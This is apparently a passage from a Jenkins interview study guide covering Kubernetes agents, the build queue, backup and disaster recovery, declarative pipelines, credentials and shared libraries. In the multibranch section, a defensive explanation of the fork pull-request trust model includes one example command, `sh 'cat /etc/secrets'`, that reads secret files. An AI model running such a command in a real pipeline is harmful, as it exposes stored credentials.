> Two methods: (1) SSH — Controller initiates connection to agent, copies agent.jar, starts agent process. Used for static agents on reachable VMs. (2) JNLP/Inbound — Agent initiates connection to Controller (TCP port 50000 or WebSocket on 443). Used for Kubernetes pods, cloud VMs behind NAT, and any agent where the Controller can't initiate SSH. Kubernetes plugin uses JNLP — the jnlp sidecar container in the pod connects outbound to the Controller.

**Q: What is a Jenkins label and how is it used?**
> A label is a tag assigned to agents that categorizes their capabilities: `linux`, `docker`, `java17`, `gpu`. Pipelines use `agent { label 'linux && docker' }` to match agents with required capabilities. The Controller's scheduler matches the requested label expression against available agents. With Kubernetes agents, labels are defined in pod templates — the plugin creates a pod from the matching template.

---

## 2.2 Build Queue & Execution Model

**Concept:** Every build passes through the Controller's build queue before reaching an agent.

**Build queue states:**
```
PENDING → BUILDABLE → ASSIGNED → RUNNING
```

- PENDING: waiting for quiet period, throttle, or dependency
- BUILDABLE: ready but no matching agent/executor available
- ASSIGNED: matched to an agent, starting
- RUNNING: executing on agent

**CPS (Continuation Passing Style) engine:**
- Jenkins transforms pipeline Groovy code to make execution state serializable to disk
- Enables pipeline durability — resume after Controller restart
- Not all Groovy constructs work in CPS context (recursion, complex closures)
- `@NonCPS` annotation marks methods that bypass CPS but lose durability

**Interview insights:**
- "A build in the queue for 30 minutes? Check the 'why' field in the queue item: no matching agent, concurrency limit, blocked by previous build, or agent label mismatch."
- Quiet period deduplication: 5 rapid pushes collapse to one build checking out HEAD
- Build queue is unbounded — webhook storms can OOM the Controller through queue growth

---

## 2.3 Agent Types (Focus: Kubernetes Agents)

### Static/Permanent Agents
```
Always connected, pre-configured. Tools pre-installed, persistent workspace cache.
Pros: No provisioning latency. Cons: Fixed capacity, config drift, 24/7 cost.
Use: Licensed tools, specialized hardware (Mac, GPU).
```

### SSH Agents
```
Controller SSH's into remote machine, copies agent.jar, starts agent process.
Requirements: SSH server, Java installed, jenkins user with SSH key.
```

### JNLP/Inbound Agents
```
Agent initiates connection TO Controller (reverse direction).
Use: agents behind NAT/firewall where Controller can't SSH in.
```

### Kubernetes Agents — The Production Standard ⚠️

```
Kubernetes Plugin provisions a new Pod for each build:
  Controller → K8s API → create pod in jenkins-agents namespace
  → Pod connects back via JNLP → build runs → pod DELETED

Key features:
  - Pod Template: containers, volumes, resources, labels
  - JNLP sidecar: handles Controller communication
  - Custom containers: maven, node, docker, helm
  - emptyDir volume: shared workspace between containers
  - Resource limits: CPU/memory enforced by Kubernetes
  - Tolerations: schedule on spot/preemptible instances
```

**Production Kubernetes pod template in Jenkinsfile:**

```groovy
pipeline {
    agent {
        kubernetes {
            yaml '''
apiVersion: v1
kind: Pod
metadata:
  labels:
    jenkins-agent: "true"
spec:
  tolerations:
  - key: "spot"
    operator: "Equal"
    value: "true"
    effect: "NoSchedule"
  nodeSelector:
    workload: jenkins-build
  containers:
  - name: jnlp
    image: jenkins/inbound-agent:latest-jdk17
    resources:
      requests: {cpu: "100m", memory: "256Mi"}
      limits: {cpu: "200m", memory: "512Mi"}
  - name: maven
    image: maven:3.9-eclipse-temurin-17
    command: ["cat"]
    tty: true
    resources:
      requests: {cpu: "500m", memory: "1Gi"}
      limits: {cpu: "2", memory: "3Gi"}
    volumeMounts:
    - name: maven-cache
      mountPath: /root/.m2/repository
  - name: kaniko
    image: gcr.io/kaniko-project/executor:debug
    command: ["cat"]
    tty: true
  - name: helm
    image: alpine/helm:3.14.0
    command: ["cat"]
    tty: true
  volumes:
  - name: maven-cache
    persistentVolumeClaim:
      claimName: maven-cache-pvc
'''
        }
    }
    stages {
        stage('Build') {
            steps {
                container('maven') { sh 'mvn clean package' }
            }
        }
        stage('Docker Build') {
            steps {
                container('kaniko') {
                    sh '/kaniko/executor --context=dir://$(pwd) --destination=registry.io/myapp:${GIT_COMMIT}'
                }
            }
        }
        stage('Deploy') {
            steps {
                container('helm') {
                    sh 'helm upgrade --install myapp ./chart --set image.tag=${GIT_COMMIT}'
                }
            }
        }
    }
}
```

**Kubernetes Agent Pros/Cons:**
```
Pros:
  ✅ Scales to zero (no idle cost)
  ✅ Perfectly clean environment per build
  ✅ Multiple containers per pod (maven + kaniko + helm)
  ✅ Resource limits enforced by Kubernetes
  ✅ Spot instances for cost savings (60-90% reduction)
  ✅ No agent maintenance — container images as agents

Cons:
  ❌ Pod startup latency (~30-60s cold start)
  ❌ No workspace caching by default (must use PVCs)
  ❌ More complex debugging (pod logs, agent communication)
```

**Interview insights:**
- `command: ["cat"] + tty: true` on every non-jnlp container — without this, containers exit immediately
- Never set `command` or `args` on the jnlp container — it breaks the agent connection
- `safe-to-evict: "false"` annotation prevents cluster autoscaler from evicting active build pods
- Use Kaniko for image building — no Docker daemon, runs unprivileged. DinD requires `privileged: true` = host root access
- Resource `requests` affect scheduling; `limits` affect what the container gets. Set `limits.memory` >= JVM max heap + 30% overhead
- Maven cache PVC is critical for performance — without it, every build downloads 200MB+ of dependencies

**Common interview questions:**

**Q: How do you handle Docker builds inside Kubernetes pods?**
> Three options: DinD (Docker-in-Docker) requires `privileged: true` which grants host root access — avoid in production. DooD (Docker-outside-of-Docker) mounts the host Docker socket — still gives host access. Kaniko builds images without a Docker daemon, runs completely unprivileged, and is recommended for Kubernetes environments. Kaniko reads the Dockerfile from the workspace, builds layers in userspace, and pushes directly to the registry.

**Q: A build pod keeps getting OOMKilled. How do you diagnose?**
> Check resource limits vs actual usage: `kubectl describe pod` shows the OOMKilled reason and the limit that was exceeded. Common cause: Maven build with `-Xmx2g` but container limit is 1Gi — the JVM tries to allocate 2GB heap but Kubernetes kills it at 1GB. Fix: set `limits.memory` to at least Xmx + 30% (for JVM non-heap, native memory). Monitor with `kubectl top pods` during builds to right-size limits. Also check if the build itself is leaking memory (e.g., running test suites that accumulate objects).

**Q: Explain the relationship between pod containers and pipeline `container()` step.**
> A Kubernetes agent pod has multiple containers sharing the same workspace via emptyDir volume. The `container('maven')` step tells Jenkins to execute subsequent `sh` commands inside the `maven` container. Without `container()`, commands run in the default container (usually jnlp). Each container has its own tools installed — maven container has `mvn`, kaniko container has `/kaniko/executor`, helm container has `helm`. All containers share the same workspace files because they all mount the same emptyDir volume at the workspace path.

---

## 2.4 Workspace Management

**Concept:** The workspace is the directory on an agent where build files live — git checkout, compiled artifacts, test reports.

**On Kubernetes pod agents:**
- Workspace is always clean (new pod per build)
- Containers in the same pod share workspace via emptyDir volume mounted at the same path
- No `cleanWs()` needed — pod destruction handles cleanup
- Must use PVCs for dependency caches (Maven, npm) to avoid re-downloading every build

**Cross-agent file transfer — Stash/Unstash:**
```groovy
// Stage 1: Build agent
stash name: 'compiled-jar', includes: 'target/*.jar'

// Stage 2: Different agent
unstash 'compiled-jar'
```

Limits: 100MB default per stash, temporary (current build only), all traffic through Controller.

**Alternatives to stash:**
- Same agent for all stages (workspace naturally shared)
- Artifact repository (Nexus, S3) for large files
- Shared PVC in Kubernetes (emptyDir for same-pod, ReadWriteMany for cross-pod)
- `archiveArtifacts` for persistence beyond the build

---

## 2.5 Jenkins Home Directory & Backup

**JENKINS_HOME critical files:**
```
$JENKINS_HOME/
├── secrets/master.key              ← CRITICAL: root encryption key
├── secrets/hudson.util.Secret      ← CRITICAL: secondary key
├── credentials.xml                 ← Encrypted credentials (needs secrets/ to decrypt)
├── config.xml                      ← System configuration
├── jobs/*/config.xml               ← Job definitions
├── jobs/*/builds/                  ← Build history, logs
├── plugins/*.jpi                   ← Plugin binaries (re-downloadable)
├── nodes/*/config.xml              ← Agent configurations
└── casc_configs/jenkins.yaml       ← JCasC configuration
```

**Backup minimum:** `secrets/` directory + `credentials.xml` + `jobs/*/config.xml`. Without `secrets/master.key`, ALL stored credentials are permanently unreadable.

**On EKS — Kubernetes PVC Snapshot backup:**
```bash
kubectl apply -f - <<EOF
apiVersion: snapshot.storage.k8s.io/v1
kind: VolumeSnapshot
metadata:
  name: jenkins-home-snapshot-$(date +%Y%m%d)
  namespace: jenkins
spec:
  volumeSnapshotClassName: csi-aws-vsc
  source:
    persistentVolumeClaimName: jenkins-home-pvc
EOF
```

**Modern DR approach with JCasC:**
```
1. Start fresh Jenkins container (same version)
2. Restore secrets/ from AWS Secrets Manager
3. Apply jenkins.yaml (JCasC) → full system config restored
4. Organization Folders auto-discover all repos → all pipelines recreated
5. Jenkins fully functional in 3-10 minutes
```

---

## 2.6 Jenkins HA & Disaster Recovery

**Core problem:** Jenkins has NO native HA — no active-active clustering, no automatic failover. Single Controller = SPOF.

**HA strategies for EKS:**

```
Strategy 1: Kubernetes Self-Healing (most common)
  Jenkins as Deployment (replicas: 1) with PVC on EBS
  → Pod crashes → K8s restarts → PVC reattaches → Jenkins resumes
  Recovery: 2-5 minutes (auto)

Strategy 2: Warm Standby
  Second Jenkins (idle) with replicated PVC or config
  DNS failover: primary fails → route to standby
  Recovery: 5-15 minutes (manual failover)

Strategy 3: JCasC + VolumeSnapshot
  Fastest cold recovery: restore PVC from snapshot, deploy Jenkins
  Recovery: 10-20 minutes
```

**What is lost on Controller crash:**
- In-flight builds: FAILED/LOST (agents disconnect)
- Build queue: LOST
- Pipeline state: depends on durability setting (PERFORMANCE_OPTIMIZED = lost)
- Configuration/history: safe on PVC

**Interview insights:**
- "Jenkins HA is a common interview trap. Jenkins does not have native HA. The answer is Kubernetes self-healing with PVC persistence, JCasC for rapid config restoration, and tested backup/restore procedures."
- CloudBees CI (commercial) offers HA with active-active Controllers — worth mentioning

**Common interview questions:**

**Q: Your Jenkins Controller just crashed. Walk through your recovery process.**
> Immediate: Kubernetes self-healing restarts the pod, PVC reattaches (2-5 min automatic recovery). All in-flight builds are lost — they'll need to be re-triggered. The build queue is reconstructed from JENKINS_HOME on the PVC. If the PVC itself is corrupted: (1) restore from latest VolumeSnapshot, (2) deploy Jenkins with restored PVC, (3) JCasC applies configuration automatically, (4) Organization Folders re-discover all pipelines, (5) restore secrets/ from AWS Secrets Manager. Full recovery: 10-20 minutes with practiced procedures.

**Q: How do you ensure Jenkins survives an AZ failure on EKS?**
> Jenkins PVC is EBS-backed, which is AZ-bound. Options: (1) Use EFS (NFS) instead of EBS — multi-AZ, but higher latency for JENKINS_HOME which is I/O intensive. (2) Regular VolumeSnapshots to S3 (cross-AZ) — restore to a new AZ if needed. (3) Treat Jenkins as cattle: JCasC + secrets backup means you can reconstruct Jenkins in any AZ from scratch in 10 minutes. Option 3 is recommended — faster than EFS migration and simpler to operate.

**Q: What about in-flight builds when the Controller restarts?**
> With `PERFORMANCE_OPTIMIZED` durability (recommended for K8s agents): all in-flight builds are lost. The Kubernetes agent pods disconnect and are eventually garbage collected. This is acceptable because: (1) builds are retriggerable via webhook or manual trigger, (2) Kubernetes agents are ephemeral anyway — they can't resume, (3) the performance benefit of reduced disk I/O outweighs occasional build loss. For pipelines with `input` steps waiting for approval, use `SURVIVABLE_NONATOMIC` so the approval state survives restart.

---

## 2.7 Jenkins at Scale

**Key scaling principles:**
- Scale horizontally by adding agents, never vertically by adding executors to Controller
- Controller ceiling: ~200-500 concurrent builds depending on tuning
- When a single Controller can't scale further: federate (multiple Controllers per team)

**Performance tuning:**
```
1. JVM: -Xms2g -Xmx4g -XX:+UseG1GC -XX:MaxGCPauseMillis=200
2. Replace ALL SCM polling with webhooks (eliminates 40%+ CPU)
3. Set pipeline durability to PERFORMANCE_OPTIMIZED for K8s agents
4. Pin Shared Library versions (enables caching)
5. Use Kubernetes agents on spot instances (68% cost reduction)
6. Mount Maven/npm caches via PVC (reduces build time 60-70%)
```

**Agent pool architecture on EKS:**
```yaml
# General compute: 90% of builds
jenkins-general:
  machineType: m5.xlarge
  autoscaling: {min: 0, max: 20}
  taints: [{key: jenkins-build, effect: NoSchedule}]

# Spot instances: cost-sensitive builds
jenkins-spot:
  machineType: m5.xlarge
  spot: true
  autoscaling: {min: 0, max: 50}

# High memory: integration tests
jenkins-high-mem:
  machineType: r5.2xlarge
  autoscaling: {min: 0, max: 5}
```

---

# 3. PIPELINES (DECLARATIVE FOCUS)

---

## 3.1 Declarative Pipeline Structure

**Concept:** Declarative Pipeline is the recommended Jenkins pipeline syntax. It wraps all logic in a `pipeline {}` block with a fixed set of structured sections.

**Complete Jenkinsfile anatomy:**

```groovy
pipeline {
    // WHERE to run
    agent {
        kubernetes { yaml '...' }
    }

    // BEHAVIOR settings
    options {
        timeout(time: 1, unit: 'HOURS')
        buildDiscarder(logRotator(numToKeepStr: '20', daysToKeepStr: '30'))
        timestamps()
        disableConcurrentBuilds()
    }

    // ENVIRONMENT VARIABLES
    environment {
        APP_NAME    = 'myservice'
        REGISTRY    = 'registry.example.com'
        IMAGE_TAG   = "${APP_NAME}:${BUILD_NUMBER}-${GIT_COMMIT.take(7)}"
        DOCKER_CREDS = credentials('docker-registry-creds')
    }

    // BUILD PARAMETERS
    parameters {
        choice(name: 'ENVIRONMENT', choices: ['dev', 'staging', 'production'])
        booleanParam(name: 'SKIP_TESTS', defaultValue: false)
        string(name: 'IMAGE_OVERRIDE', defaultValue: '', description: 'Override image tag')
    }

    // AUTOMATIC TRIGGERS
    triggers {
        githubPush()               // Webhook-based (preferred)
        cron('H 2 * * 7')         // Weekly maintenance builds
        upstream(upstreamProjects: 'shared-library', threshold: 'SUCCESS')
    }

    // THE WORK
    stages {
        stage('Build') { steps { sh 'mvn clean package' } }
        stage('Test')  { steps { sh 'mvn verify' } }
        stage('Deploy') {
            when { branch 'main' }
            steps { sh 'helm upgrade --install ...' }
        }
    }

    // CLEANUP & NOTIFICATIONS
    post {
        always  { cleanWs() }
        success { slackSend channel: '#deploys', message: "✅ ${JOB_NAME} passed" }
        failure { slackSend channel: '#alerts', message: "❌ ${JOB_NAME} FAILED" }
    }
}
```

**Directive reference:**

| Directive | Location | Purpose |
|-----------|----------|---------|
| `agent` | pipeline / stage | Where to run |
| `options` | pipeline / stage | Behavior (timeout, retry, discard) |
| `environment` | pipeline / stage | Environment variables |
| `parameters` | pipeline | Build parameters |
| `triggers` | pipeline | Automatic trigger conditions |
| `stages` | pipeline | Container for all stage blocks |
| `when` | inside stage | Conditional execution |
| `post` | pipeline / stage | Cleanup and notifications |
| `script` | inside steps | Escape to full Groovy |

---

## 3.2 Declarative vs Scripted Pipeline

| Aspect | Declarative | Scripted |
|--------|------------|---------|
| Syntax | `pipeline { }` | `node { }` |
| Structure | Fixed directives | Any Groovy |
| Validation | Pre-flight syntax check | Runtime only |
| Flexibility | 90% of use cases | 100% — full Groovy |
| Learning curve | Lower | Higher (Groovy knowledge) |
| `when` conditions | Built-in directive | Manual `if/else` |
| `post` actions | Built-in directive | `try/catch/finally` |
| IDE support | Full completion | Limited |
| Recommended | ✅ Primary choice | Comparison/legacy |

**When to use Scripted:**
- Dynamic stage generation (looping over a list to create stages)
- Complex error handling beyond what `post {}` provides
- Matrix-like behavior on older Jenkins versions

**Hybrid approach — best of both:**
```groovy
pipeline {
    agent any
    stages {
        stage('Dynamic') {
            steps {
                script {
                    // Full Groovy inside Declarative
                    def services = ['auth', 'payment', 'order']
                    services.each { svc ->
                        echo "Processing ${svc}"
                    }
                }
            }
        }
    }
}
```

---

## 3.3 Parallel Stages

**Concept:** Run multiple stages simultaneously to reduce total pipeline time.

```
SEQUENTIAL: Lint(2m) → Tests(5m) → SAST(3m) → DepCheck(4m) = 14 min
PARALLEL:   All simultaneously = 5 min (longest wins)
```

**Declarative parallel syntax:**

```groovy
stage('Quality Checks') {
    failFast true  // Cancel all on first failure
    parallel {
        stage('Unit Tests') {
            agent { label 'java' }
            steps { sh 'mvn test -Psuite-unit' }
            post { always { junit 'target/surefire-reports/*.xml' } }
        }
        stage('SAST Scan') {
            agent { label 'linux' }
            steps { sh 'semgrep --config auto src/' }
        }
        stage('Dependency Check') {
            agent { label 'linux' }
            steps { sh 'mvn dependency-check:check' }
        }
    }
}
```

**On Kubernetes — parallel stages in same pod:**

```groovy
pipeline {
    agent {
        kubernetes {
            yaml '''
spec:
  containers:
  - name: jnlp
    image: jenkins/inbound-agent:latest-jdk17
  - name: maven
    image: maven:3.9-eclipse-temurin-17
    command: ["cat"]
    tty: true
  - name: trivy
    image: aquasec/trivy:latest
    command: ["cat"]
    tty: true
'''
        }
    }
    stages {
        stage('Parallel in Same Pod') {
            parallel {
                stage('Build') {
                    steps { container('maven') { sh 'mvn package' } }
                }
                stage('Security Scan') {
                    steps { container('trivy') { sh 'trivy fs --severity HIGH,CRITICAL .' } }
                }
            }
        }
    }
}
```

**Interview insights:**
- `failFast true` cancels all parallel branches on first failure — good for builds, bad if you need all combination failures for reporting
- Groovy closure variable capture bug in dynamic parallel: always capture loop variable in a `def` inside the closure
- Each parallel branch on different agents needs separate executor slots — with K8s, separate pods

---

## 3.4 Parameters

**All parameter types:**

```groovy
parameters {
    string(name: 'VERSION', defaultValue: '1.0.0', description: 'Release version')
    booleanParam(name: 'DRY_RUN', defaultValue: false)
    choice(name: 'ENV', choices: ['dev', 'staging', 'production'])
    text(name: 'RELEASE_NOTES', defaultValue: '')
    password(name: 'API_KEY', description: 'Sensitive input')
}
```

**Important gotcha:** `parameters {}` block only takes effect after the FIRST build discovers them. The first build triggered after adding parameters won't have them available.

---

## 3.5 Triggers

```groovy
triggers {
    githubPush()                    // Webhook (preferred — instant, no polling)
    pollSCM('H/5 * * * *')         // Poll every 5 min (anti-pattern — wastes Controller CPU)
    cron('H 2 * * 7')              // Weekly at 2am (H = hash-based spread)
    upstream(upstreamProjects: 'lib-build', threshold: 'SUCCESS')
}
```

**Webhooks over polling:** Polling creates N API calls per interval per job. With 500 jobs polling every 5 minutes, that's 6,000 API calls/hour. Webhooks: zero overhead, instant trigger.

---

## 3.6 Stash/Unstash

**When to use:**
- Short-lived, within same build, files needed by a later stage on a different agent
- Limit: 100MB default, exists only for current build

**When NOT to use:**
- Files >100MB → use artifact repository (Nexus, ECR, S3)
- Cross-build sharing → use `archiveArtifacts` or registry
- Same-pod in Kubernetes → use emptyDir volume (workspace shared between containers)

---

## 3.7 Environment Variables

**Built-in Jenkins env vars:**
```
${env.JOB_NAME}        // myapp/main
${env.BUILD_NUMBER}     // 42
${env.GIT_COMMIT}       // full SHA
${env.BRANCH_NAME}      // main (Multibranch only)
${env.WORKSPACE}        // /home/jenkins/workspace/myapp
${env.BUILD_URL}        // https://jenkins.../42/
```

**Scoping:**
```groovy
environment {
    // Pipeline-wide
    APP_NAME = 'myservice'
    CREDS = credentials('my-creds')  // Creates CREDS, CREDS_USR, CREDS_PSW
}
stages {
    stage('Build') {
        environment {
            // Stage-scoped — overrides pipeline-level
            BUILD_TYPE = 'release'
        }
    }
}
```

**GString vs Shell variable trap:**
```groovy
// Double quotes = Groovy interpolation FIRST, then shell
sh "echo ${env.BUILD_NUMBER}"  // Groovy resolves it

// Single quotes = shell resolves
sh 'echo $BUILD_NUMBER'        // Shell resolves it

// Escaping $ in double quotes for shell variables
sh "echo \$HOME"               // Shell resolves $HOME
```

---

## 3.8 Credentials

**Credential binding types:**

```groovy
withCredentials([
    usernamePassword(credentialsId: 'docker-creds',
                     usernameVariable: 'USER', passwordVariable: 'PASS'),
    string(credentialsId: 'sonar-token', variable: 'SONAR_TOKEN'),
    file(credentialsId: 'kubeconfig', variable: 'KUBECONFIG'),
    sshUserPrivateKey(credentialsId: 'ssh-key',
                      keyFileVariable: 'KEY', usernameVariable: 'SSH_USER')
]) {
    sh 'echo $PASS | docker login -u $USER --password-stdin'
    sh 'kubectl --kubeconfig=$KUBECONFIG get pods'
}
```

**Security rules:**
- Credentials are automatically masked in console output (`****`)
- Variables are unset after `withCredentials {}` block closes
- Never use `echo ${PASS}` — even masked, it can be captured in pipeline replay
- Credential scoping: FOLDER scope (team-specific) > GLOBAL scope (org-wide) > SYSTEM scope (Jenkins infra)

---

## 3.9 Shared Libraries

**Concept:** Reusable pipeline code shared across all Jenkinsfiles in an organization. The DRY mechanism for Jenkins at scale.

**Structure:**
```
jenkins-shared-library/
├── vars/                          # Global variables (pipeline steps)
│   ├── buildAndPush.groovy        # Called as: buildAndPush(image: 'myapp')
│   ├── deployToK8s.groovy
│   └── notifySlack.groovy
└── src/                           # Classes (complex logic)
    └── com/company/
        └── PipelineUtils.groovy
```

**vars/buildAndPush.groovy example:**
```groovy
def call(Map config) {
    def image = config.image
    def tag = config.tag ?: env.BUILD_NUMBER

    sh "docker build -t ${image}:${tag} ."
    withCredentials([usernamePassword(credentialsId: 'ecr-creds',
                                      usernameVariable: 'U', passwordVariable: 'P')]) {
        sh "echo \$P | docker login -u \$U --password-stdin"
        sh "docker push ${image}:${tag}"
    }
}
```

**Consuming in Jenkinsfile:**
```groovy
@Library('jenkins-shared-library@v2.4.0') _  // Pin version!

pipeline {
    stages {
        stage('Build') {
            steps { buildAndPush(image: 'registry.io/myapp', tag: env.GIT_COMMIT.take(7)) }
        }
        stage('Deploy') {
            steps { deployToK8s(namespace: 'staging', chart: './chart') }
        }
    }
}
```

**Interview insights:**
- Pin Shared Library to exact version tag — floating `@main` defeats Jenkins's compiled-class caching
- Without Shared Libraries, 50 repos × 200 lines of Jenkinsfile = 50 divergent pipelines. With them: 50 × 15 lines
- Shared Library itself is versioned in Git with its own CI pipeline (test the library before releasing)

**Common interview questions:**

**Q: How do you prevent code duplication across 50 microservice pipelines?**
> Jenkins Shared Libraries. Common steps — `buildAndPush()`, `deployToK8s()`, `runSecurityScan()` — are defined in a central library repository. Each Jenkinsfile calls these with parameters. When I update the Docker build process (e.g., add a security flag), I update once in the library, and all 50 pipelines pick up the change. The library is versioned in Git and can be pinned by consuming Jenkinsfiles.

**Q: What's the difference between vars/ and src/ in Shared Libraries?**
> `vars/` contains global variables — simple pipeline steps callable by name from any Jenkinsfile. `vars/buildAndPush.groovy` with a `call()` method is invoked as `buildAndPush(image: 'myapp')` directly in steps. `src/` contains class-based Groovy code for complex logic — utility classes, helper methods, data structures. `src/` classes must be imported and instantiated. Use `vars/` for 90% of cases — it's simpler and provides the step-level abstraction teams need.

**Q: A team updates the Shared Library and breaks all pipelines. How do you prevent this?**
> Version pinning: `@Library('jenkins-shared-library@v2.4.0') _` — each Jenkinsfile pins a specific version. Library updates are released as new tags. Teams opt-in to new versions by updating their pin. Critical library changes go through PR review and testing. Never use `@Library('jenkins-shared-library@main')` in production — floating references mean untested changes affect all pipelines immediately.

**Pipeline template pattern:**

```groovy
// vars/standardPipeline.groovy — Shared Library
def call(Map config) {
    pipeline {
        agent {
            kubernetes { yaml libraryResource('pod-templates/standard.yaml') }
        }
        options {
            timeout(time: 30, unit: 'MINUTES')
            buildDiscarder(logRotator(numToKeepStr: '20'))
            timestamps()
        }
        stages {
            stage('Build') {
                steps { container('maven') { sh "mvn clean package" } }
            }
            stage('Test') {
                steps { container('maven') { sh "mvn verify" } }
                post { always { junit 'target/surefire-reports/*.xml' } }
            }
            stage('Docker') {
                steps {
                    container('kaniko') {
                        sh "/kaniko/executor --destination=${config.registry}/${config.image}:${BUILD_NUMBER}"
                    }
                }
            }
            stage('Deploy') {
                when { branch 'main' }
                steps {
                    container('helm') {
                        sh "helm upgrade --install ${config.app} ./chart --set image.tag=${BUILD_NUMBER}"
                    }
                }
            }
        }
    }
}

// Consuming Jenkinsfile — 3 lines:
@Library('jenkins-shared-library@v3.0.0') _
standardPipeline(app: 'order-service', image: 'order-service', registry: 'registry.io')
```

# 4. ADVANCED PIPELINE BEHAVIOR

---

## 4.1 Multibranch Pipelines

**Concept:** Automatically discovers branches with a Jenkinsfile in a repository and creates a pipeline job per branch. Zero manual configuration per branch.

**How it works:**
```
Push to feature/login → Webhook notifies Jenkins
→ Multibranch Pipeline scans repo → finds Jenkinsfile in feature/login
→ Creates pipeline job: myapp/feature%2Flogin
→ Runs pipeline → reports status back to GitHub
→ Branch deleted → Jenkins removes the job
```

**Key environment variables in Multibranch:**
- `BRANCH_NAME` — the branch name (e.g., `feature/login`, `main`)
- `CHANGE_ID` — PR number (only set for PR builds)
- `CHANGE_TARGET` — target branch of the PR
- `CHANGE_AUTHOR` — PR author username

**Interview insights:**
- Fork PR trust model is critical: untrusted PRs from forks should NOT run arbitrary Jenkinsfile code (security risk — `sh 'cat /etc/secrets'`)
- Configure: "Trust: Nobody" for fork PRs, or "Trust: From users with admin/write access"

**Common interview questions:**

**Q: A developer creates a feature branch and pushes. Walk through what happens.**
> (1) Push triggers GitHub webhook to Jenkins. (2) Multibranch Pipeline's branch source receives the webhook. (3) Jenkins scans the repo for a Jenkinsfile in the new branch. (4) If found, Jenkins creates a new pipeline job for that branch: `myapp/feature%2Flogin`. (5) The Jenkinsfile from the branch is loaded and executed — the branch gets its own pipeline definition. (6) Build result is reported back to GitHub as a commit status check. (7) When the branch is deleted (after PR merge), Jenkins automatically removes the pipeline job.

**Q: What is CHANGE_ID and when is it populated?**
> `CHANGE_ID` is set ONLY for Pull Request builds — it contains the PR number. Its presence tells you this build was triggered by a PR, not a branch push. Use it in `when` conditions: `when { changeRequest() }` or `when { expression { env.CHANGE_ID != null } }`. This is how you differentiate PR builds from branch builds — running different stages for each.

**Q: How do you handle a multi-branch pipeline for a monorepo?**
> With `changeset` conditions in `when` directives: each stage checks which files changed and only runs if relevant files were modified. Example: `when { changeset 'services/auth/**' }` runs the auth build only when auth code changed. Combined with parallel stages, you get efficient monorepo CI where each commit only builds affected services.

**Organization Folders:**
- Scan an entire GitHub Organization — auto-discovers all repos with Jenkinsfiles
- Zero-config pipeline provisioning: add a Jenkinsfile to any repo → pipeline appears automatically
- GitHub App authentication preferred: fine-grained permissions, no personal token dependency, higher rate limits, Checks API integration

---

## 4.2 Manual Approval Gates (Input Steps)

**Concept:** Pause pipeline and wait for human approval — implements Continuous Delivery.

**Critical pattern — release agent during approval:**

```groovy
pipeline {
    agent none  // No global agent
    stages {
        stage('Build') {
            agent { kubernetes { yaml '...' } }
            steps { sh 'mvn package' }
            // Agent RELEASED after this stage
        }
        stage('Approval') {
            agent none  // No executor consumed while waiting
            steps {
                timeout(time: 24, unit: 'HOURS') {
                    input(
                        message: 'Deploy to production?',
                        ok: 'Deploy',
                        submitter: 'release-managers',
                        submitterParameter: 'DEPLOYER'
                    )
                }
            }
        }
        stage('Deploy') {
            agent { kubernetes { yaml '...' } }
            steps { sh 'helm upgrade --install ...' }
        }
    }
}
```

**Interview insights:**
- Without `agent none`, the agent executor is held idle for hours — blocking other builds
- Always wrap `input` in `timeout()` to auto-reject stale approvals
- `submitterParameter` captures who approved — audit trail
- Jenkins restart during input wait: pipeline resumes and input continues (durability permitting)

---

## 4.3 Retry / Timeout

**Nesting matters:**
```groovy
// Each attempt gets 10 minutes:
retry(3) {
    timeout(time: 10, unit: 'MINUTES') {
        sh './flaky-integration-test.sh'
    }
}

// Total of 10 minutes for all 3 attempts:
timeout(time: 10, unit: 'MINUTES') {
    retry(3) {
        sh './flaky-integration-test.sh'
    }
}
```

---

## 4.4 Conditional Execution (when)

```groovy
stage('Deploy') {
    when {
        branch 'main'                              // Branch name
        environment name: 'ENV', value: 'prod'     // Env var match
        expression { return params.DEPLOY == true } // Groovy expression
        changeset 'src/**'                         // File change
        tag 'v*'                                   // Tag build
        changeRequest target: 'main'               // PR targeting main
        allOf { branch 'main'; expression { ... } } // AND
        anyOf { branch 'main'; branch 'release/*' } // OR
        not { branch 'feature/*' }                 // NOT
        beforeAgent true  // Evaluate BEFORE spinning up agent (saves resources)
    }
    steps { sh 'helm upgrade ...' }
}
```

**`beforeAgent true` optimization:** If `when` evaluates false, the expensive agent (GPU, Mac) is never allocated. Critical for cost efficiency.

---

## 4.5 Pipeline Durability

**Concept:** Controls how much pipeline state Jenkins saves to disk, trading durability against performance.

| Setting | Disk I/O | Survives Restart? |
|---------|----------|-------------------|
| MAX_SURVIVABILITY | Every step | Yes — resumes from exact step |
| SURVIVABLE_NONATOMIC | Periodic | Mostly — some recent steps lost |
| PERFORMANCE_OPTIMIZED | Minimal | No — build restarts from beginning |

**For Kubernetes agents: use PERFORMANCE_OPTIMIZED.**
- Pods are ephemeral — on Controller restart, pods are gone anyway
- No point in saving state if the agent won't exist to resume on
- Reduces Controller I/O by 50%+

```groovy
pipeline {
    options {
        durabilityHint('PERFORMANCE_OPTIMIZED')
    }
}
```

**Exception:** Stages with `input` steps should use at least SURVIVABLE_NONATOMIC — the approval wait must survive Controller restart.

---

## 4.6 Build Promotion

**Concept:** Moving a single, immutable artifact through progressively more rigorous environments. Build once, deploy same artifact everywhere.

**Immutable artifact traceability chain:**
```
GitHub commit abc1234
  → CI build #42 → Docker image: registry.io/myservice:42-abc1234
    → Dev:        registry.io/myservice:42-abc1234 ✅
    → Staging:    registry.io/myservice:42-abc1234 ✅
    → Production: registry.io/myservice:42-abc1234 ✅

P1 incident? kubectl get deploy → image:42-abc1234 → build #42 → commit abc1234 → PR #156
Root cause found in 60 seconds.
```

**Three promotion models:**
1. **Linear pipeline** — single pipeline: build → test → staging → input → production
2. **GitOps promotion** — CI updates config repo; Argo CD deploys
3. **Parameterized promote job** — separate pipeline that takes build number and deploys

---

# 5. PLUGINS (ESSENTIAL ONLY)

---

## 5.1 Essential Plugin Stack

| Plugin | Purpose |
|--------|---------|
| `git` | SCM integration, clone, checkout |
| `workflow-aggregator` | Pipeline engine (Declarative + Scripted) |
| `kubernetes` | Kubernetes pod agents ⚠️ |
| `configuration-as-code` | JCasC — YAML-based Jenkins config ⚠️ |
| `credentials-binding` | Secure credential injection |
| `role-strategy` | RBAC authorization ⚠️ |
| `github-branch-source` | Multibranch + Organization Folders |
| `pipeline-utility-steps` | readJSON, readYaml, file operations |
| `ws-cleanup` | Workspace cleanup |
| `timestamper` | Timestamps in console output |
| `prometheus` | Metrics export for monitoring |
| `slack` | Build notifications |
| `lockable-resources` | Prevent concurrent access to resources |

---

## 5.2 Kubernetes Plugin (VERY IMPORTANT)

